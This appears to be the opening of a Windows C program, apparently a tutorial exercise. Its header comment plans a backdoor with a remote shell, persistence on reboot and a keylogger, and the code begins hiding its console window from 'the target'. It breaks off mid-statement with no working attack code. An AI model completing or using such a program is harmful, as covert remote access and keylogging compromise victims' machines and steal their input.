/* 
1. Create connection with the server (inside a main function)
2. Create a shell function (wait for incoming command iterate over certain options)
3. Automatically start the program when the machine is rebooted
4. Start/ Spawn other programs 
5. Navigating through different directories
6. Implementing keylogger to our keylogger 
*/

#include<stdio.h>
#include<stdlib.h>
#include<unistd.h>
#include<winsock2.h>
#include<windows.h>
#include<winuser.h>
#include<wininet.h>
#include<windowsx.h>
#include<string.h>
#include<sys/stat.h>
#include<sys/types.h>


int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPerv, LPSTR lpCmdL, int nCmdShow){
// APIENTRY is an alias for WINAPI. WINAPI itself is a definition for the type of calling convention used for windows API calls, the stdcall. Basically this is explaining to the compiler how to handle the stack and arguments when calling this function.
// HINSTANCE is used to handle an instance or a module
// "handle to an instance" or "handle to a module." The operating system uses this value to identify the executable (EXE) when it is loaded in memory. The instance handle is needed for certain Windows functions—for example, to load icons or bitmaps.
// lpstr means long pointer to string. Back before 32-bit processors, pointers to memory that might be in a different segment of memory (think, a long way away in memory), needed extra space to store. On 32-bit (and later) processors, they're exactly the same thing.

    HWND stealth; //windows not visible to the target 
    AllocConsole();
    stealth = FindWindowA("ConsoleWindowClass", NULL)
    





}